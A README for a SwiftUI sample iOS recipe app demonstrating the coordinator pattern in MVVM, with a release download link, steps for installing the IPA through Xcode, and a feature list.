# 🍽️ Recipes - Discover Easy Cooking with SwiftUI

## 📋 Overview

Welcome to the Recipes app! This is a sample iOS application built using SwiftUI. It demonstrates the coordinator pattern in the MVVM architecture. With this app, you can explore various recipes and learn simple cooking methods. 

## 🚀 Getting Started

Follow these steps to download and run the Recipes app on your device.

1. **Check Requirements**
   - **Device**: You need an iPhone or iPad.
   - **OS Version**: iOS 14.0 or later.
   - **Storage**: At least 100 MB of free space.
   - **Network**: Internet connection is necessary for downloading the app and fetching recipes.

2. **Visit the Releases Page**  
   To download the Recipes app, please visit the Releases page below:  
   [Download Recipes](https://github.com/Sushiii24/Recipes/releases)

## 📥 Download & Install

Once you are on the Releases page, follow these steps:

1. Locate the latest version of the Recipes app.
2. Click on the version to expand the details.
3. Find the download link for the app's IPA file.
4. Click the link to begin downloading the IPA file.

After downloading, use Xcode to install the app on your device:

1. Open Xcode on your Mac.
2. Connect your iPhone or iPad using a USB cable.
3. In Xcode, go to "Window" > "Devices and Simulators."
4. Select your connected device.
5. Drag the downloaded IPA file into the "Installed Apps" section in Xcode. Xcode will install the app on your device.

Now you can find Recipes on your home screen. Go ahead and open it!

## 📚 Features

- **Easy Recipe Navigation**: Find recipes quickly with the organized categories.
- **Step-by-step Instructions**: Each recipe provides clear steps to follow, making cooking simple.
- **Recipe Search**: Use the search feature to find specific dishes by name or ingredient.
- **Favorites**: Save your favorite recipes for easy access later.
- **User-Friendly Interface**: Enjoy a clean and simple layout designed for easy use.
